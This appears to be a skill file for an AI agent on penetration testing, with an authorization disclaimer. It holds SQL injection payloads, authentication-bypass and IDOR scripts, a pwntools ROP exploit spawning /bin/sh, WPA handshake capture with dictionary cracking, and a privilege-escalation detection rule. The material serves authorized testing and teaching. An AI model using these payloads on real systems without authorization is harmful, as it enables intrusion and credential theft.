# Penetration Testing Skill

Comprehensive ethical hacking and security assessment capabilities for web applications, networks, and cloud infrastructure with modern offensive security tools and methodologies.

## Skill Overview

This skill provides expert-level penetration testing and vulnerability assessment capabilities following industry standards (OWASP, NIST, PTES) with a focus on web applications, APIs, cloud environments, and modern DevSecOps integration.

**IMPORTANT**: This skill is designed for authorized security testing only. All techniques should be used exclusively for:
- Authorized penetration testing engagements
- CTF competitions and security training
- Defensive security research and analysis
- Educational purposes with proper authorization

## Core Capabilities

### Web Application Security Testing
- **OWASP Top 10 assessment** - Comprehensive testing for latest vulnerability classes
- **API security testing** - REST, GraphQL, and gRPC endpoint security analysis
- **Authentication bypass** - Session management and access control testing
- **Business logic flaws** - Application workflow and process vulnerabilities

### Network Security Assessment
- **Network reconnaissance** - Host discovery, port scanning, service enumeration
- **Vulnerability scanning** - Automated and manual vulnerability identification
- **Privilege escalation** - Local and remote privilege escalation techniques
- **Lateral movement** - Post-exploitation techniques and persistence mechanisms

### Cloud Security Testing
- **AWS/Azure/GCP assessment** - Cloud-specific misconfigurations and vulnerabilities
- **Container security** - Docker and Kubernetes security testing
- **IAM assessment** - Identity and access management security evaluation
- **Serverless security** - Function-as-a-Service security analysis

### Mobile Application Testing
- **Static analysis** - Source code and binary analysis for vulnerabilities
- **Dynamic analysis** - Runtime behavior and API communication testing
- **Reverse engineering** - Application logic and security control analysis
- **Data storage security** - Local storage and keychain security assessment

## Modern Testing Methodologies

### OWASP Testing Framework Integration
```bash
# OWASP ZAP automated scanning
zap-cli start --start-options '-config api.disablekey=true'
zap-cli open-url https://target-application.com
zap-cli spider https://target-application.com
zap-cli active-scan https://target-application.com
zap-cli report -o /tmp/zap-report.html -f html

# OWASP Nuclei for modern vulnerability scanning
nuclei -u https://target-application.com -t nuclei-templates/ -o nuclei-results.txt
nuclei -l targets.txt -workflows nuclei-templates/workflows/ -c 50

# OWASP Amass for attack surface discovery
amass enum -active -d target-domain.com -config amass-config.ini
amass intel -d target-domain.com -whois
```

### Burp Suite Professional Automation
```python
# Burp Suite Professional API integration
import requests
import json

class BurpSuiteAPI:
    def __init__(self, api_url="http://127.0.0.1:1337", api_key=None):
        self.api_url = api_url
        self.api_key = api_key

    def start_scan(self, target_url, scan_configs=None):
        """Start automated scan with custom configurations"""
        data = {
            "scan_type": "crawl_and_audit",
            "urls": [target_url],
            "scan_configurations": scan_configs or [
                {
                    "name": "OWASP Top 10",
                    "enabled": True
                },
                {
                    "name": "JavaScript analysis",
                    "enabled": True
                }
            ]
        }

        response = requests.post(
            f"{self.api_url}/v0.1/scan",
            json=data,
            headers={"Authorization": f"Bearer {self.api_key}"}
        )

        return response.json()["task_id"]

    def get_scan_results(self, task_id):
        """Retrieve scan results and generate report"""
        response = requests.get(
            f"{self.api_url}/v0.1/scan/{task_id}",
            headers={"Authorization": f"Bearer {self.api_key}"}
        )

        return response.json()
```

### Custom Security Testing Scripts
```python
# Advanced SQL injection testing
import requests
import itertools
from urllib.parse import urljoin

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT null,version(),null--",
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --"
        ]

    def test_parameter(self, param_name, param_value):
        """Test parameter for SQL injection vulnerabilities"""
        results = []

        for payload in self.payloads:
            test_value = param_value + payload

            try:
                response = requests.get(
                    self.target_url,
                    params={param_name: test_value},
                    timeout=10
                )

                # Detect potential SQL injection
                if self._detect_sql_injection(response):
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": self._extract_evidence(response)
                    })

            except requests.RequestException as e:
                continue

        return results

    def _detect_sql_injection(self, response):
        """Detect SQL injection based on response patterns"""
        sql_errors = [
            "MySQL", "postgres", "ORA-", "Microsoft OLE DB",
            "SQLite", "SQLSTATE", "syntax error"
        ]

        return any(error in response.text for error in sql_errors)
```

### API Security Testing Framework
```python
# Comprehensive API security testing
import requests
import json
from requests.auth import HTTPBasicAuth

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()

        if auth_token:
            self.session.headers.update({
                "Authorization": f"Bearer {auth_token}"
            })

    def test_authentication_bypass(self, endpoints):
        """Test for authentication bypass vulnerabilities"""
        results = []

        for endpoint in endpoints:
            # Test without authentication
            response_no_auth = self.session.get(f"{self.base_url}{endpoint}")

            # Test with invalid token
            headers = {"Authorization": "Bearer invalid_token"}
            response_invalid = self.session.get(
                f"{self.base_url}{endpoint}",
                headers=headers
            )

            # Test with SQL injection in auth header
            headers = {"Authorization": "Bearer ' OR '1'='1' --"}
            response_sqli = self.session.get(
                f"{self.base_url}{endpoint}",
                headers=headers
            )

            if any(r.status_code == 200 for r in [response_no_auth, response_invalid, response_sqli]):
                results.append({
                    "endpoint": endpoint,
                    "vulnerability": "Authentication Bypass",
                    "severity": "High"
                })

        return results

    def test_idor_vulnerabilities(self, endpoint_template, id_range):
        """Test for Insecure Direct Object References"""
        results = []

        for user_id in range(1, id_range + 1):
            endpoint = endpoint_template.format(id=user_id)
            response = self.session.get(f"{self.base_url}{endpoint}")

            if response.status_code == 200:
                # Check if response contains sensitive data
                if self._contains_sensitive_data(response.json()):
                    results.append({
                        "endpoint": endpoint,
                        "user_id": user_id,
                        "vulnerability": "IDOR",
                        "data": response.json()
                    })

        return results

    def _contains_sensitive_data(self, data):
        """Detect sensitive data in API responses"""
        sensitive_fields = [
            "password", "ssn", "credit_card", "api_key",
            "private_key", "secret", "token"
        ]

        data_str = json.dumps(data).lower()
        return any(field in data_str for field in sensitive_fields)
```

## Cloud Security Assessment

### AWS Security Testing
```bash
# AWS CLI security assessment
# Check for public S3 buckets
aws s3api list-buckets --query 'Buckets[*].Name' --output text | \
while read bucket; do
    aws s3api get-bucket-acl --bucket "$bucket" 2>/dev/null | \
    grep -q "AllUsers\|AuthenticatedUsers" && \
    echo "Public bucket found: $bucket"
done

# Check for overly permissive IAM policies
aws iam list-policies --scope Local --query 'Policies[*].Arn' --output text | \
while read policy; do
    aws iam get-policy-version \
        --policy-arn "$policy" \
        --version-id $(aws iam get-policy --policy-arn "$policy" \
                      --query 'Policy.DefaultVersionId' --output text) | \
    grep -q "\"Effect\": \"Allow\", \"Action\": \"*\"" && \
    echo "Overly permissive policy: $policy"
done

# ScoutSuite automated cloud security assessment
python -m ScoutSuite aws --profile production --report-dir /tmp/scout-report
```

### Container Security Testing
```bash
# Docker security assessment
# Check for privileged containers
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}" | \
while read name image status; do
    docker inspect "$name" | jq -r '.[] | select(.HostConfig.Privileged == true) | .Name'
done

# Trivy container vulnerability scanning
trivy image --security-checks vuln,config,secret nginx:latest
trivy filesystem --security-checks vuln,config,secret /path/to/project

# Falco runtime security monitoring rules
rules:
- rule: Detect Privilege Escalation
  desc: Detect attempts to escalate privileges
  condition: >
    spawned_process and proc.name in (sudo, su, doas) and
    not user.name in (root, admin)
  output: >
    Privilege escalation attempt (user=%user.name command=%proc.cmdline)
  priority: WARNING
  tags: [process, privilege_escalation]
```

## Advanced Testing Techniques

### Binary Exploitation Testing
```python
# Buffer overflow detection
import struct
from pwn import *

def test_buffer_overflow(target_binary, input_size_range):
    """Test for buffer overflow vulnerabilities"""
    results = []

    for size in range(*input_size_range):
        try:
            # Create payload
            payload = b"A" * size

            # Execute binary with payload
            p = process(target_binary)
            p.sendline(payload)

            # Check for crash
            try:
                p.recv(timeout=1)
                p.close()
            except EOFError:
                # Process crashed - potential buffer overflow
                results.append({
                    "payload_size": size,
                    "vulnerability": "Buffer Overflow",
                    "severity": "High"
                })
                break

        except Exception as e:
            continue

    return results

def craft_rop_exploit(binary_path, overflow_offset):
    """Craft ROP-based exploit for buffer overflow"""
    elf = ELF(binary_path)
    rop = ROP(elf)

    # Find useful gadgets
    rop.execve('/bin/sh', 0, 0)

    payload = b"A" * overflow_offset
    payload += rop.chain()

    return payload
```

### Wireless Security Assessment
```bash
# WiFi security testing with aircrack-ng suite
# Monitor mode setup
airmon-ng start wlan0

# Network discovery
airodump-ng wlan0mon

# WPA handshake capture
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# Bluetooth security assessment
hcitool scan
bluetoothctl devices
l2ping -c 4 00:11:22:33:44:55
```

## Reporting and Documentation

### Automated Report Generation
```python
# Comprehensive penetration test report generator
import json
from jinja2 import Template
from datetime import datetime

class PentestReporter:
    def __init__(self, template_path="report_template.html"):
        with open(template_path) as f:
            self.template = Template(f.read())

    def generate_report(self, findings, target_info):
        """Generate comprehensive pentest report"""
        report_data = {
            "date": datetime.now().strftime("%Y-%m-%d"),
            "target": target_info,
            "executive_summary": self._generate_executive_summary(findings),
            "findings": self._categorize_findings(findings),
            "risk_matrix": self._generate_risk_matrix(findings),
            "recommendations": self._generate_recommendations(findings)
        }

        return self.template.render(**report_data)

    def _categorize_findings(self, findings):
        """Categorize findings by severity and type"""
        categories = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": [],
            "informational": []
        }

        for finding in findings:
            severity = finding.get("severity", "low").lower()
            categories[severity].append(finding)

        return categories

    def _generate_risk_matrix(self, findings):
        """Generate risk assessment matrix"""
        risk_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}

        for finding in findings:
            severity = finding.get("severity", "low").lower()
            if severity in risk_counts:
                risk_counts[severity] += 1

        return risk_counts
```

### CVSS Scoring Integration
```python
# CVSS v3.1 scoring calculator
class CVSSCalculator:
    def __init__(self):
        self.base_metrics = {
            "AV": {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2},
            "AC": {"L": 0.77, "H": 0.44},
            "PR": {"N": 0.85, "L": 0.62, "H": 0.27},
            "UI": {"N": 0.85, "R": 0.62},
            "S": {"U": "Unchanged", "C": "Changed"},
            "C": {"H": 0.56, "L": 0.22, "N": 0.0},
            "I": {"H": 0.56, "L": 0.22, "N": 0.0},
            "A": {"H": 0.56, "L": 0.22, "N": 0.0}
        }

    def calculate_base_score(self, metrics):
        """Calculate CVSS base score"""
        exploitability = (
            8.22 *
            self.base_metrics["AV"][metrics["AV"]] *
            self.base_metrics["AC"][metrics["AC"]] *
            self.base_metrics["PR"][metrics["PR"]] *
            self.base_metrics["UI"][metrics["UI"]]
        )

        impact = (
            1 - (
                (1 - self.base_metrics["C"][metrics["C"]]) *
                (1 - self.base_metrics["I"][metrics["I"]]) *
                (1 - self.base_metrics["A"][metrics["A"]])
            )
        )

        if metrics["S"] == "U":
            impact = 6.42 * impact
        else:
            impact = 7.52 * (impact - 0.029) - 3.25 * (impact - 0.02) ** 15

        if impact <= 0:
            return 0.0

        if metrics["S"] == "U":
            base_score = min(exploitability + impact, 10.0)
        else:
            base_score = min(1.08 * (exploitability + impact), 10.0)

        return round(base_score, 1)
```

## Skill Activation Triggers

This skill automatically activates when:
- Security assessment or penetration testing is requested
- Vulnerability scanning is needed
- Security code review is required
- Compliance testing (PCI DSS, SOC 2) is requested
- Threat modeling or security architecture review is needed
- Incident response or forensic analysis is required

## Ethical Guidelines and Legal Compliance

### Authorization Requirements
- **Written authorization** required before any testing
- **Scope definition** clearly documented and agreed upon
- **Legal compliance** with local and international laws
- **Data protection** ensuring no unauthorized data access

### Responsible Disclosure
- **Coordinated disclosure** for discovered vulnerabilities
- **Grace period** for vendors to patch critical issues
- **Public disclosure** only after vendor remediation
- **Documentation** of disclosure timeline and communications

This comprehensive penetration testing skill provides expert-level security assessment capabilities while maintaining strict ethical standards and legal compliance requirements.